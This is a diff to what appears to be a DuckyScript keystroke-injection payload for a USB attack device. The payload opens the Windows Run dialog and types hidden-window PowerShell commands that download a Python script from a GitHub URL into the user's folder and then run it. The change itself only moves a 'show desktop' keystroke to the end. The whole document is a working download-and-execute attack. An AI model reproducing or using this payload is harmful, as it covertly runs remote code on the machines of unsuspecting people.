@@ -1,8 +1,5 @@
 DEFINE #SCRIPTURL https://raw.githubusercontent.com/castrosp/payloads/refs/heads/main/mouse/mouse.py
 
-GUI d
-DELAY 1000
-
 GUI r
 DELAY 500
 STRING powershell -w h Invoke-WebRequest -Uri #SCRIPTURL -OutFile C:/Users/$env:UserName\script.py
@@ -16,3 +13,5 @@ STRING powershell -w h Start-Process python.exe -ArgumentList C:/Users/$env:User
 ENTER
 DELAY 1000
 STRING exit
+
+GUI d
